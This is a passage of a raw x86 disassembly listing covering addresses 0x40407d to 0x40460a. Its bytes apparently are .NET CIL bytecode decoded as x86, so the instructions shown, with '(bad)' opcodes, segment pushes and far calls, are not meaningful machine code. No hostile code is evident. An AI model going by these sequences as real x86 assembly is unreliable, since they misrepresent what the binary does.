  40407d:	2b 1c 06             	sub    (%esi,%eax,1),%ebx
  404080:	12 04 28             	adc    (%eax,%ebp,1),%al
  404083:	77 00                	ja     0x404085
  404085:	00 0a                	add    %cl,(%edx)
  404087:	03 12                	add    (%edx),%edx
  404089:	04 28                	add    $0x28,%al
  40408b:	78 00                	js     0x40408d
  40408d:	00 0a                	add    %cl,(%edx)
  40408f:	08 04 28             	or     %al,(%eax,%ebp,1)
  404092:	1d 00 00 06 6f       	sbb    $0x6f060000,%eax
  404097:	11 00                	adc    %eax,(%eax)
  404099:	00 0a                	add    %cl,(%edx)
  40409b:	09 6f 07             	or     %ebp,0x7(%edi)
  40409e:	00 00                	add    %al,(%eax)
  4040a0:	0a 2d 9e de 14 09    	or     0x914de9e,%ch
  4040a6:	75 22                	jne    0x4040ca
  4040a8:	00 00                	add    %al,(%eax)
  4040aa:	01 13                	add    %edx,(%ebx)
  4040ac:	05 11 05 2c 07       	add    $0x72c0511,%eax
  4040b1:	11 05 6f 19 00 00    	adc    %eax,0x196f
  4040b7:	0a dc                	or     %ah,%bl
  4040b9:	2a 03                	sub    (%ebx),%al
  4040bb:	6f                   	outsl  %ds:(%esi),(%dx)
  4040bc:	53                   	push   %ebx
  4040bd:	00 00                	add    %al,(%eax)
  4040bf:	0a 04 28             	or     (%eax,%ebp,1),%al
  4040c2:	9c                   	pushf
  4040c3:	00 00                	add    %al,(%eax)
  4040c5:	06                   	push   %es
  4040c6:	0b 02                	or     (%edx),%eax
  4040c8:	6f                   	outsl  %ds:(%esi),(%dx)
  4040c9:	15 00 00 0a 0d       	adc    $0xd0a0000,%eax
  4040ce:	38 ac 00 00 00 09 6f 	cmp    %ch,0x6f090000(%eax,%eax,1)
  4040d5:	06                   	push   %es
  4040d6:	00 00                	add    %al,(%eax)
  4040d8:	0a a5 1d 00 00 01    	or     0x100001d(%ebp),%ah
  4040de:	13 06                	adc    (%esi),%eax
  4040e0:	12 06                	adc    (%esi),%al
  4040e2:	28 77 00             	sub    %dh,0x0(%edi)
  4040e5:	00 0a                	add    %cl,(%edx)
  4040e7:	39 93 00 00 00 28    	cmp    %edx,0x28000000(%ebx)
  4040ed:	79 00                	jns    0x4040ef
  4040ef:	00 0a                	add    %cl,(%edx)
  4040f1:	72 e4                	jb     0x4040d7
  4040f3:	01 00                	add    %eax,(%eax)
  4040f5:	70 17                	jo     0x40410e
  4040f7:	8d 02                	lea    (%edx),%eax
  4040f9:	00 00                	add    %al,(%eax)
  4040fb:	01 25 16 12 06 28    	add    %esp,0x28061216
  404101:	77 00                	ja     0x404103
  404103:	00 0a                	add    %cl,(%edx)
  404105:	a2 28 7a 00 00       	mov    %al,0x7a28
  40410a:	0a 13                	or     (%ebx),%dl
  40410c:	07                   	pop    %es
  40410d:	12 06                	adc    (%esi),%al
  40410f:	28 78 00             	sub    %bh,0x0(%eax)
  404112:	00 0a                	add    %cl,(%edx)
  404114:	13 08                	adc    (%eax),%ecx
  404116:	04 6f                	add    $0x6f,%al
  404118:	04 01                	add    $0x1,%al
  40411a:	00 06                	add    %al,(%esi)
  40411c:	2c 54                	sub    $0x54,%al
  40411e:	73 54                	jae    0x404174
  404120:	00 00                	add    %al,(%eax)
  404122:	0a 13                	or     (%ebx),%dl
  404124:	09 11                	or     %edx,(%ecx)
  404126:	09 72 42             	or     %esi,0x42(%edx)
  404129:	01 00                	add    %eax,(%eax)
  40412b:	70 02                	jo     0x40412f
  40412d:	6f                   	outsl  %ds:(%esi),(%dx)
  40412e:	55                   	push   %ebp
  40412f:	00 00                	add    %al,(%eax)
  404131:	0a 14 11             	or     (%ecx,%edx,1),%dl
  404134:	08 11                	or     %dl,(%ecx)
  404136:	09 04 11             	or     %eax,(%ecx,%edx,1)
  404139:	07                   	pop    %es
  40413a:	03 73 14             	add    0x14(%ebx),%esi
  40413d:	01 00                	add    %eax,(%eax)
  40413f:	06                   	push   %es
  404140:	13 0a                	adc    (%edx),%ecx
  404142:	11 0a                	adc    %ecx,(%edx)
  404144:	1c 6f                	sbb    $0x6f,%al
  404146:	1a 01                	sbb    (%ecx),%al
  404148:	00 06                	add    %al,(%esi)
  40414a:	04 6f                	add    $0x6f,%al
  40414c:	04 01                	add    $0x1,%al
  40414e:	00 06                	add    %al,(%esi)
  404150:	11 0a                	adc    %ecx,(%edx)
  404152:	6f                   	outsl  %ds:(%esi),(%dx)
  404153:	10 01                	adc    %al,(%ecx)
  404155:	00 06                	add    %al,(%esi)
  404157:	11 0a                	adc    %ecx,(%edx)
  404159:	6f                   	outsl  %ds:(%esi),(%dx)
  40415a:	1b 01                	sbb    (%ecx),%eax
  40415c:	00 06                	add    %al,(%esi)
  40415e:	2d 1f 11 0a 6f       	sub    $0x6f0a111f,%eax
  404163:	21 01                	and    %eax,(%ecx)
  404165:	00 06                	add    %al,(%esi)
  404167:	13 07                	adc    (%edi),%eax
  404169:	11 0a                	adc    %ecx,(%edx)
  40416b:	6f                   	outsl  %ds:(%esi),(%dx)
  40416c:	1f                   	pop    %ds
  40416d:	01 00                	add    %eax,(%eax)
  40416f:	06                   	push   %es
  404170:	13 08                	adc    (%eax),%ecx
  404172:	07                   	pop    %es
  404173:	02 03                	add    (%ebx),%al
  404175:	11 07                	adc    %eax,(%edi)
  404177:	11 08                	adc    %ecx,(%eax)
  404179:	04 6f                	add    $0x6f,%al
  40417b:	90                   	nop
  40417c:	00 00                	add    %al,(%eax)
  40417e:	06                   	push   %es
  40417f:	09 6f 07             	or     %ebp,0x7(%edi)
  404182:	00 00                	add    %al,(%eax)
  404184:	0a 3a                	or     (%edx),%bh
  404186:	49                   	dec    %ecx
  404187:	ff                   	(bad)
  404188:	ff                   	(bad)
  404189:	ff                   	lcall  (bad)
  40418a:	de 14 09             	ficoms (%ecx,%ecx,1)
  40418d:	75 22                	jne    0x4041b1
  40418f:	00 00                	add    %al,(%eax)
  404191:	01 13                	add    %edx,(%ebx)
  404193:	05 11 05 2c 07       	add    $0x72c0511,%eax
  404198:	11 05 6f 19 00 00    	adc    %eax,0x196f
  40419e:	0a dc                	or     %ah,%bl
  4041a0:	2a 00                	sub    (%eax),%al
  4041a2:	00 00                	add    %al,(%eax)
  4041a4:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  4041a7:	00 02                	add    %al,(%edx)
  4041a9:	00 27                	add    %ah,(%edi)
  4041ab:	00 66 8d             	add    %ah,-0x73(%esi)
  4041ae:	00 14 00             	add    %dl,(%eax,%eax,1)
  4041b1:	00 00                	add    %al,(%eax)
  4041b3:	00 02                	add    %al,(%edx)
  4041b5:	00 b6 00 be 74 01    	add    %dh,0x174be00(%esi)
  4041bb:	14 00                	adc    $0x0,%al
  4041bd:	00 00                	add    %al,(%eax)
  4041bf:	00 13                	add    %dl,(%ebx)
  4041c1:	30 02                	xor    %al,(%edx)
  4041c3:	00 3e                	add    %bh,(%esi)
  4041c5:	00 00                	add    %al,(%eax)
  4041c7:	00 15 00 00 11 02    	add    %dl,0x2110000
  4041cd:	17                   	pop    %ss
  4041ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4041cf:	70 00                	jo     0x4041d1
  4041d1:	00 0a                	add    %cl,(%edx)
  4041d3:	0a 06                	or     (%esi),%al
  4041d5:	2c 04                	sub    $0x4,%al
  4041d7:	06                   	push   %es
  4041d8:	8e 2d 02 14 2a 06    	mov    0x62a1402,%gs
  4041de:	0b 16                	or     (%esi),%edx
  4041e0:	0c 2b                	or     $0x2b,%al
  4041e2:	1f                   	pop    %ds
  4041e3:	07                   	pop    %es
  4041e4:	08 9a 75 0b 00 00    	or     %bl,0xb75(%edx)
  4041ea:	01 0d 09 2c 0f 09    	add    %ecx,0x90f2c09
  4041f0:	75 1a                	jne    0x40420c
  4041f2:	00 00                	add    %al,(%eax)
  4041f4:	02 13                	add    (%ebx),%dl
  4041f6:	04 11                	add    $0x11,%al
  4041f8:	04 2c                	add    $0x2c,%al
  4041fa:	03 11                	add    (%ecx),%edx
  4041fc:	04 2a                	add    $0x2a,%al
  4041fe:	08 17                	or     %dl,(%edi)
  404200:	58                   	pop    %eax
  404201:	0c 08                	or     $0x8,%al
  404203:	07                   	pop    %es
  404204:	8e 69 32             	mov    0x32(%ecx),%gs
  404207:	db 14 2a             	fistl  (%edx,%ebp,1)
  40420a:	00 00                	add    %al,(%eax)
  40420c:	13 30                	adc    (%eax),%esi
  40420e:	02 00                	add    (%eax),%al
  404210:	c9                   	leave
  404211:	00 00                	add    %al,(%eax)
  404213:	00 16                	add    %dl,(%esi)
  404215:	00 00                	add    %al,(%eax)
  404217:	11 02                	adc    %eax,(%edx)
  404219:	14 28                	adc    $0x28,%al
  40421b:	4f                   	dec    %edi
  40421c:	00 00                	add    %al,(%eax)
  40421e:	0a 2c 0b             	or     (%ebx,%ecx,1),%ch
  404221:	72 ec                	jb     0x40420f
  404223:	01 00                	add    %eax,(%eax)
  404225:	70 73                	jo     0x40429a
  404227:	4b                   	dec    %ebx
  404228:	00 00                	add    %al,(%eax)
  40422a:	0a 7a 02             	or     0x2(%edx),%bh
  40422d:	6f                   	outsl  %ds:(%esi),(%dx)
  40422e:	62 00                	bound  %eax,(%eax)
  404230:	00 0a                	add    %cl,(%edx)
  404232:	0a 16                	or     (%esi),%dl
  404234:	0b 38                	or     (%eax),%edi
  404236:	93                   	xchg   %eax,%ebx
  404237:	00 00                	add    %al,(%eax)
  404239:	00 06                	add    %al,(%esi)
  40423b:	07                   	pop    %es
  40423c:	9a 0c 08 6f 5e 00 00 	lcall  $0x0,$0x5e6f080c
  404243:	0a 39                	or     (%ecx),%bh
  404245:	80 00 00             	addb   $0x0,(%eax)
  404248:	00 08                	add    %cl,(%eax)
  40424a:	6f                   	outsl  %ds:(%esi),(%dx)
  40424b:	5f                   	pop    %edi
  40424c:	00 00                	add    %al,(%eax)
  40424e:	0a d0                	or     %al,%dl
  404250:	14 00                	adc    $0x0,%al
  404252:	00 01                	add    %al,(%ecx)
  404254:	28 3c 00             	sub    %bh,(%eax,%eax,1)
  404257:	00 0a                	add    %cl,(%edx)
  404259:	28 4f 00             	sub    %cl,0x0(%edi)
  40425c:	00 0a                	add    %cl,(%edx)
  40425e:	2c 09                	sub    $0x9,%al
  404260:	08 6f 60             	or     %ch,0x60(%edi)
  404263:	00 00                	add    %al,(%eax)
  404265:	0a 17                	or     (%edi),%dl
  404267:	9a 2a 08 6f 5f 00 00 	lcall  $0x0,$0x5f6f082a
  40426e:	0a d0                	or     %al,%dl
  404270:	34 00                	xor    $0x0,%al
  404272:	00 01                	add    %al,(%ecx)
  404274:	28 3c 00             	sub    %bh,(%eax,%eax,1)
  404277:	00 0a                	add    %cl,(%edx)
  404279:	28 4f 00             	sub    %cl,0x0(%edi)
  40427c:	00 0a                	add    %cl,(%edx)
  40427e:	2c 09                	sub    $0x9,%al
  404280:	08 6f 60             	or     %ch,0x60(%edi)
  404283:	00 00                	add    %al,(%eax)
  404285:	0a 16                	or     (%esi),%dl
  404287:	9a 2a 08 6f 5f 00 00 	lcall  $0x0,$0x5f6f082a
  40428e:	0a d0                	or     %al,%dl
  404290:	25 00 00 01 28       	and    $0x28010000,%eax
  404295:	3c 00                	cmp    $0x0,%al
  404297:	00 0a                	add    %cl,(%edx)
  404299:	28 4f 00             	sub    %cl,0x0(%edi)
  40429c:	00 0a                	add    %cl,(%edx)
  40429e:	2c 09                	sub    $0x9,%al
  4042a0:	08 6f 60             	or     %ch,0x60(%edi)
  4042a3:	00 00                	add    %al,(%eax)
  4042a5:	0a 16                	or     (%esi),%dl
  4042a7:	9a 2a 08 6f 5f 00 00 	lcall  $0x0,$0x5f6f082a
  4042ae:	0a d0                	or     %al,%dl
  4042b0:	20 00                	and    %al,(%eax)
  4042b2:	00 01                	add    %al,(%ecx)
  4042b4:	28 3c 00             	sub    %bh,(%eax,%eax,1)
  4042b7:	00 0a                	add    %cl,(%edx)
  4042b9:	28 4f 00             	sub    %cl,0x0(%edi)
  4042bc:	00 0a                	add    %cl,(%edx)
  4042be:	2c 09                	sub    $0x9,%al
  4042c0:	08 6f 60             	or     %ch,0x60(%edi)
  4042c3:	00 00                	add    %al,(%eax)
  4042c5:	0a 16                	or     (%esi),%dl
  4042c7:	9a 2a 07 17 58 0b 07 	lcall  $0x70b,$0x5817072a
  4042ce:	06                   	push   %es
  4042cf:	8e 69 3f             	mov    0x3f(%ecx),%gs
  4042d2:	64 ff                	fs (bad)
  4042d4:	ff                   	(bad)
  4042d5:	ff d0                	call   *%eax
  4042d7:	02 00                	add    (%eax),%al
  4042d9:	00 01                	add    %al,(%ecx)
  4042db:	28 3c 00             	sub    %bh,(%eax,%eax,1)
  4042de:	00 0a                	add    %cl,(%edx)
  4042e0:	2a 00                	sub    (%eax),%al
  4042e2:	00 00                	add    %al,(%eax)
  4042e4:	1b 30                	sbb    (%eax),%esi
  4042e6:	06                   	push   %es
  4042e7:	00 64 02 00          	add    %ah,0x0(%edx,%eax,1)
  4042eb:	00 17                	add    %dl,(%edi)
  4042ed:	00 00                	add    %al,(%eax)
  4042ef:	11 04 14             	adc    %eax,(%esp,%edx,1)
  4042f2:	28 4f 00             	sub    %cl,0x0(%edi)
  4042f5:	00 0a                	add    %cl,(%edx)
  4042f7:	2c 0b                	sub    $0xb,%al
  4042f9:	72 0a                	jb     0x404305
  4042fb:	02 00                	add    (%eax),%al
  4042fd:	70 73                	jo     0x404372
  4042ff:	4b                   	dec    %ebx
  404300:	00 00                	add    %al,(%eax)
  404302:	0a 7a 04             	or     0x4(%edx),%bh
  404305:	d0 02                	rolb   $1,(%edx)
  404307:	00 00                	add    %al,(%eax)
  404309:	01 28                	add    %ebp,(%eax)
  40430b:	3c 00                	cmp    $0x0,%al
  40430d:	00 0a                	add    %cl,(%edx)
  40430f:	28 4f 00             	sub    %cl,0x0(%edi)
  404312:	00 0a                	add    %cl,(%edx)
  404314:	2c 02                	sub    $0x2,%al
  404316:	03 2a                	add    (%edx),%ebp
  404318:	05 25 2d 06 26       	add    $0x26062d25,%eax
  40431d:	73 e2                	jae    0x404301
  40431f:	00 00                	add    %al,(%eax)
  404321:	06                   	push   %es
  404322:	10 03                	adc    %al,(%ebx)
  404324:	03 75 55             	add    0x55(%ebp),%esi
  404327:	00 00                	add    %al,(%eax)
  404329:	01 3a                	add    %edi,(%edx)
  40432b:	ea 00 00 00 04 6f 56 	ljmp   $0x566f,$0x4000000
  404332:	00 00                	add    %al,(%eax)
  404334:	0a 39                	or     (%ecx),%bh
  404336:	8d 00                	lea    (%eax),%eax
  404338:	00 00                	add    %al,(%eax)
  40433a:	03 75 09             	add    0x9(%ebp),%esi
  40433d:	00 00                	add    %al,(%eax)
  40433f:	01 0d 09 39 80 00    	add    %ecx,0x803909
  404345:	00 00                	add    %al,(%eax)
  404347:	04 6f                	add    $0x6f,%al
  404349:	57                   	push   %edi
  40434a:	00 00                	add    %al,(%eax)
  40434c:	0a 13                	or     (%ebx),%dl
  40434e:	04 73                	add    $0x73,%al
  404350:	7b 00                	jnp    0x404352
  404352:	00 0a                	add    %cl,(%edx)
  404354:	13 05 09 6f 18 00    	adc    0x186f09,%eax
  40435a:	00 0a                	add    %cl,(%edx)
  40435c:	13 07                	adc    (%edi),%eax
  40435e:	2b 1b                	sub    (%ebx),%ebx
  404360:	11 07                	adc    %eax,(%edi)
  404362:	6f                   	outsl  %ds:(%esi),(%dx)
  404363:	06                   	push   %es
  404364:	00 00                	add    %al,(%eax)
  404366:	0a 13                	or     (%ebx),%dl
  404368:	08 11                	or     %dl,(%ecx)
  40436a:	05 02 11 08 11       	add    $0x11081102,%eax
  40436f:	04 05                	add    $0x5,%al
  404371:	28 1d 00 00 06 6f    	sub    %bl,0x6f060000
  404377:	7c 00                	jl     0x404379
  404379:	00 0a                	add    %cl,(%edx)
  40437b:	11 07                	adc    %eax,(%edi)
  40437d:	6f                   	outsl  %ds:(%esi),(%dx)
  40437e:	07                   	pop    %es
  40437f:	00 00                	add    %al,(%eax)
  404381:	0a 2d dc de 15 11    	or     0x1115dedc,%ch
  404387:	07                   	pop    %es
  404388:	75 22                	jne    0x4043ac
  40438a:	00 00                	add    %al,(%eax)
  40438c:	01 13                	add    %edx,(%ebx)
  40438e:	09 11                	or     %edx,(%ecx)
  404390:	09 2c 07             	or     %ebp,(%edi,%eax,1)
  404393:	11 09                	adc    %ecx,(%ecx)
  404395:	6f                   	outsl  %ds:(%esi),(%dx)
  404396:	19 00                	sbb    %eax,(%eax)
  404398:	00 0a                	add    %cl,(%edx)
  40439a:	dc 11                	fcoml  (%ecx)
  40439c:	04 11                	add    $0x11,%al
  40439e:	05 6f 7d 00 00       	add    $0x7d6f,%eax
  4043a3:	0a 28                	or     (%eax),%ch
  4043a5:	58                   	pop    %eax
  4043a6:	00 00                	add    %al,(%eax)
  4043a8:	0a 13                	or     (%ebx),%dl
  4043aa:	06                   	push   %es
  4043ab:	11 06                	adc    %eax,(%esi)
  4043ad:	2c 15                	sub    $0x15,%al
  4043af:	11 05 6f 7e 00 00    	adc    %eax,0x7e6f
  4043b5:	0a 11                	or     (%ecx),%dl
  4043b7:	06                   	push   %es
  4043b8:	11 05 6f 7d 00 00    	adc    %eax,0x7d6f
  4043be:	0a 28                	or     (%eax),%ch
  4043c0:	7f 00                	jg     0x4043c2
  4043c2:	00 0a                	add    %cl,(%edx)
  4043c4:	11 06                	adc    %eax,(%esi)
  4043c6:	2a 04 05 02 03 14 14 	sub    0x14140302(,%eax,1),%al
  4043cd:	28 0d 00 00 06 0c    	sub    %cl,0xc060000
  4043d3:	08 2c 43             	or     %ch,(%ebx,%eax,2)
  4043d6:	03 75 09             	add    0x9(%ebp),%esi
  4043d9:	00 00                	add    %al,(%eax)
  4043db:	01 13                	add    %edx,(%ebx)
  4043dd:	0a 11                	or     (%ecx),%dl
  4043df:	0a 2c 37             	or     (%edi,%esi,1),%ch
  4043e2:	08 02                	or     %al,(%edx)
  4043e4:	04 11                	add    $0x11,%al
  4043e6:	0a 75 1e             	or     0x1e(%ebp),%dh
  4043e9:	00 00                	add    %al,(%eax)
  4043eb:	01 13                	add    %edx,(%ebx)
  4043ed:	0b 11                	or     (%ecx),%edx
  4043ef:	0b 2d 03 16 2b 07    	or     0x72b1603,%ebp
  4043f5:	11 0b                	adc    %ecx,(%ebx)
  4043f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4043f8:	09 00                	or     %eax,(%eax)
  4043fa:	00 0a                	add    %cl,(%edx)
  4043fc:	05 03 28 0c 00       	add    $0xc2803,%eax
  404401:	00 06                	add    %al,(%esi)
  404403:	6f                   	outsl  %ds:(%esi),(%dx)
  404404:	52                   	push   %edx
  404405:	00 00                	add    %al,(%eax)
  404407:	06                   	push   %es
  404408:	02 11                	add    (%ecx),%dl
  40440a:	0a 08                	or     (%eax),%cl
  40440c:	05 28 0e 00 00       	add    $0xe28,%eax
  404411:	06                   	push   %es
  404412:	08 6f 51             	or     %ch,0x51(%edi)
  404415:	00 00                	add    %al,(%eax)
  404417:	06                   	push   %es
  404418:	2a 03                	sub    (%ebx),%al
  40441a:	75 08                	jne    0x404424
  40441c:	00 00                	add    %al,(%eax)
  40441e:	01 0a                	add    %ecx,(%edx)
  404420:	06                   	push   %es
  404421:	2c 1c                	sub    $0x1c,%al
  404423:	02 04 16             	add    (%esi,%edx,1),%al
  404426:	05 03 28 0c 00       	add    $0xc2803,%eax
  40442b:	00 06                	add    %al,(%esi)
  40442d:	13 0c 11             	adc    (%ecx,%edx,1),%ecx
  404430:	0c 2c                	or     $0x2c,%al
  404432:	09 06                	or     %eax,(%esi)
  404434:	11 0c 05 28 19 00 00 	adc    %ecx,0x1928(,%eax,1)
  40443b:	06                   	push   %es
  40443c:	11 0c 2a             	adc    %ecx,(%edx,%ebp,1)
  40443f:	04 d0                	add    $0xd0,%al
  404441:	08 00                	or     %al,(%eax)
  404443:	00 1b                	add    %bl,(%ebx)
  404445:	28 3c 00             	sub    %bh,(%eax,%eax,1)
  404448:	00 0a                	add    %cl,(%edx)
  40444a:	28 4f 00             	sub    %cl,0x0(%edi)
  40444d:	00 0a                	add    %cl,(%edx)
  40444f:	2c 4f                	sub    $0x4f,%al
  404451:	03 75 55             	add    0x55(%ebp),%esi
  404454:	00 00                	add    %al,(%eax)
  404456:	01 0b                	add    %ecx,(%ebx)
  404458:	07                   	pop    %es
  404459:	2c 45                	sub    $0x45,%al
  40445b:	05 6f f8 00 00       	add    $0xf86f,%eax
  404460:	06                   	push   %es
  404461:	8c 1b                	mov    %ds,(%ebx)
  404463:	00 00                	add    %al,(%eax)
  404465:	02 20                	add    (%eax),%ah
  404467:	00 00                	add    %al,(%eax)
  404469:	02 00                	add    (%eax),%al
  40446b:	8c 1b                	mov    %ds,(%ebx)
  40446d:	00 00                	add    %al,(%eax)
  40446f:	02 28                	add    (%eax),%ch
  404471:	80 00 00             	addb   $0x0,(%eax)
  404474:	0a 2c 29             	or     (%ecx,%ebp,1),%ch
  404477:	07                   	pop    %es
  404478:	28 81 00 00 0a 13    	sub    %al,0x130a0000(%ecx)
  40447e:	0d dd cd 00 00       	or     $0xcddd,%eax
  404483:	00 13                	add    %dl,(%ebx)
  404485:	0e                   	push   %cs
  404486:	72 28                	jb     0x4044b0
  404488:	02 00                	add    (%eax),%al
  40448a:	70 11                	jo     0x40449d
  40448c:	0e                   	push   %cs
  40448d:	73 31                	jae    0x4044c0
  40448f:	01 00                	add    %eax,(%eax)
  404491:	06                   	push   %es
  404492:	05 28 30 00 00       	add    $0x3028,%eax
  404497:	06                   	push   %es
  404498:	14 13                	adc    $0x13,%al
  40449a:	0d dd b1 00 00       	or     $0xb1dd,%eax
  40449f:	00 04 d0             	add    %al,(%eax,%edx,8)
  4044a2:	03 00                	add    (%eax),%eax
  4044a4:	00 01                	add    %al,(%ecx)
  4044a6:	28 3c 00             	sub    %bh,(%eax,%eax,1)
  4044a9:	00 0a                	add    %cl,(%edx)
  4044ab:	28 4f 00             	sub    %cl,0x0(%edi)
  4044ae:	00 0a                	add    %cl,(%edx)
  4044b0:	2c 47                	sub    $0x47,%al
  4044b2:	03 75 03             	add    0x3(%ebp),%esi
  4044b5:	00 00                	add    %al,(%eax)
  4044b7:	01 2c 02             	add    %ebp,(%edx,%eax,1)
  4044ba:	03 2a                	add    (%edx),%ebp
  4044bc:	28 79 00             	sub    %bh,0x0(%ecx)
  4044bf:	00 0a                	add    %cl,(%edx)
  4044c1:	72 e4                	jb     0x4044a7
  4044c3:	01 00                	add    %eax,(%eax)
  4044c5:	70 17                	jo     0x4044de
  4044c7:	8d 02                	lea    (%edx),%eax
  4044c9:	00 00                	add    %al,(%eax)
  4044cb:	01 25 16 03 a2 28    	add    %esp,0x28a20316
  4044d1:	7a 00                	jp     0x4044d3
  4044d3:	00 0a                	add    %cl,(%edx)
  4044d5:	13 0f                	adc    (%edi),%ecx
  4044d7:	11 0f                	adc    %ecx,(%edi)
  4044d9:	28 6d 00             	sub    %ch,0x0(%ebp)
  4044dc:	00 0a                	add    %cl,(%edx)
  4044de:	2d 19 11 0f 05       	sub    $0x50f1119,%eax
  4044e3:	6f                   	outsl  %ds:(%esi),(%dx)
  4044e4:	ef                   	out    %eax,(%dx)
  4044e5:	00 00                	add    %al,(%eax)
  4044e7:	06                   	push   %es
  4044e8:	12 10                	adc    (%eax),%dl
  4044ea:	28 2f                	sub    %ch,(%edi)
  4044ec:	00 00                	add    %al,(%eax)
  4044ee:	06                   	push   %es
  4044ef:	2c 08                	sub    $0x8,%al
  4044f1:	11 10                	adc    %edx,(%eax)
  4044f3:	8c 03                	mov    %es,(%ebx)
  4044f5:	00 00                	add    %al,(%eax)
  4044f7:	01 2a                	add    %ebp,(%edx)
  4044f9:	04 d0                	add    $0xd0,%al
  4044fb:	66 00 00             	data16 add %al,(%eax)
  4044fe:	01 28                	add    %ebp,(%eax)
  404500:	3c 00                	cmp    $0x0,%al
  404502:	00 0a                	add    %cl,(%edx)
  404504:	28 4f 00             	sub    %cl,0x0(%edi)
  404507:	00 0a                	add    %cl,(%edx)
  404509:	2c 3c                	sub    $0x3c,%al
  40450b:	28 79 00             	sub    %bh,0x0(%ecx)
  40450e:	00 0a                	add    %cl,(%edx)
  404510:	72 e4                	jb     0x4044f6
  404512:	01 00                	add    %eax,(%eax)
  404514:	70 17                	jo     0x40452d
  404516:	8d 02                	lea    (%edx),%eax
  404518:	00 00                	add    %al,(%eax)
  40451a:	01 25 16 03 a2 28    	add    %esp,0x28a20316
  404520:	7a 00                	jp     0x404522
  404522:	00 0a                	add    %cl,(%edx)
  404524:	13 11                	adc    (%ecx),%edx
  404526:	11 11                	adc    %edx,(%ecx)
  404528:	28 6d 00             	sub    %ch,0x0(%ebp)
  40452b:	00 0a                	add    %cl,(%edx)
  40452d:	2d 18 11 11 12       	sub    $0x12111118,%eax
  404532:	12 28                	adc    (%eax),%ch
  404534:	82 00 00             	addb   $0x0,(%eax)
  404537:	0a 2c 0d 11 12 73 83 	or     -0x7c8cedef(,%ecx,1),%ch
  40453e:	00 00                	add    %al,(%eax)
  404540:	0a 8c 66 00 00 01 2a 	or     0x2a010000(%esi,%eiz,2),%cl
  404547:	03 04 14             	add    (%esp,%edx,1),%eax
  40454a:	14 28                	adc    $0x28,%al
  40454c:	d5 00                	aad    $0x0
  40454e:	00 06                	add    %al,(%esi)
  404550:	2a 11                	sub    (%ecx),%dl
  404552:	0d 2a 01 1c 00       	or     $0x1c012a,%eax
  404557:	00 02                	add    %al,(%edx)
  404559:	00 6e 00             	add    %ch,0x0(%esi)
  40455c:	28 96 00 15 00 00    	sub    %dl,0x1500(%esi)
  404562:	00 00                	add    %al,(%eax)
  404564:	00 00                	add    %al,(%eax)
  404566:	87 01                	xchg   %eax,(%ecx)
  404568:	0d 94 01 1c 0e       	or     $0xe1c0194,%eax
  40456d:	00 00                	add    %al,(%eax)
  40456f:	01 13                	add    %edx,(%ebx)
  404571:	30 04 00             	xor    %al,(%eax,%eax,1)
  404574:	5e                   	pop    %esi
  404575:	00 00                	add    %al,(%eax)
  404577:	00 18                	add    %bl,(%eax)
  404579:	00 00                	add    %al,(%eax)
  40457b:	11 02                	adc    %eax,(%edx)
  40457d:	28 33                	sub    %dh,(%ebx)
  40457f:	00 00                	add    %al,(%eax)
  404581:	06                   	push   %es
  404582:	2d 02 14 2a 02       	sub    $0x22a1402,%eax
  404587:	6f                   	outsl  %ds:(%esi),(%dx)
  404588:	84 00                	test   %al,(%eax)
  40458a:	00 0a                	add    %cl,(%edx)
  40458c:	26 73 7b             	es jae 0x40460a
  40458f:	00 00                	add    %al,(%eax)
  404591:	0a 0a                	or     (%edx),%cl
  404593:	02 03                	add    (%ebx),%al
  404595:	17                   	pop    %ss
  404596:	12 02                	adc    (%edx),%al
  404598:	28 29                	sub    %ch,(%ecx)
  40459a:	00 00                	add    %al,(%eax)
  40459c:	06                   	push   %es
  40459d:	0b 07                	or     (%edi),%eax
  40459f:	28 85 00 00 0a 2d    	sub    %al,0x2d0a0000(%ebp)
  4045a5:	07                   	pop    %es
  4045a6:	06                   	push   %es
  4045a7:	07                   	pop    %es
  4045a8:	6f                   	outsl  %ds:(%esi),(%dx)
  4045a9:	7c 00                	jl     0x4045ab
  4045ab:	00 0a                	add    %cl,(%edx)
  4045ad:	08 2c 07             	or     %ch,(%edi,%eax,1)
  4045b0:	06                   	push   %es
  4045b1:	6f                   	outsl  %ds:(%esi),(%dx)
  4045b2:	7e 00                	jle    0x4045b4
  4045b4:	00 0a                	add    %cl,(%edx)
  4045b6:	2a 02                	sub    (%edx),%al
  4045b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4045b9:	86 00                	xchg   %al,(%eax)
  4045bb:	00 0a                	add    %cl,(%edx)
  4045bd:	16                   	push   %ss
  4045be:	2f                   	das
  4045bf:	d3 02                	roll   %cl,(%edx)
  4045c1:	28 24 00             	sub    %ah,(%eax,%eax,1)
  4045c4:	00 06                	add    %al,(%esi)
  4045c6:	1f                   	pop    %ds
  4045c7:	5d                   	pop    %ebp
  4045c8:	28 1f                	sub    %bl,(%edi)
  4045ca:	00 00                	add    %al,(%eax)
  4045cc:	06                   	push   %es
  4045cd:	03 28                	add    (%eax),%ebp
  4045cf:	30 00                	xor    %al,(%eax)
  4045d1:	00 06                	add    %al,(%esi)
  4045d3:	06                   	push   %es
  4045d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4045d5:	7e 00                	jle    0x4045d7
  4045d7:	00 0a                	add    %cl,(%edx)
  4045d9:	2a 00                	sub    (%eax),%al
  4045db:	00 13                	add    %dl,(%ebx)
  4045dd:	30 04 00             	xor    %al,(%eax,%eax,1)
  4045e0:	5e                   	pop    %esi
  4045e1:	00 00                	add    %al,(%eax)
  4045e3:	00 00                	add    %al,(%eax)
  4045e5:	00 00                	add    %al,(%eax)
  4045e7:	00 02                	add    %al,(%edx)
  4045e9:	16                   	push   %ss
  4045ea:	6a 2f                	push   $0x2f
  4045ec:	1c 72                	sbb    $0x72,%al
  4045ee:	af                   	scas   %es:(%edi),%eax
  4045ef:	02 00                	add    (%eax),%al
  4045f1:	70 0f                	jo     0x404602
  4045f3:	01 28                	add    %ebp,(%eax)
  4045f5:	87 00                	xchg   %eax,(%eax)
  4045f7:	00 0a                	add    %cl,(%edx)
  4045f9:	72 23                	jb     0x40461e
  4045fb:	03 00                	add    (%eax),%eax
  4045fd:	70 28                	jo     0x404627
  4045ff:	5b                   	pop    %ebx
  404600:	00 00                	add    %al,(%eax)
  404602:	0a 73 30             	or     0x30(%ebx),%dh
  404605:	01 00                	add    %eax,(%eax)
  404607:	06                   	push   %es
  404608:	2a 1b                	sub    (%ebx),%bl
  40460a:	8d 55 00             	lea    0x0(%ebp),%edx
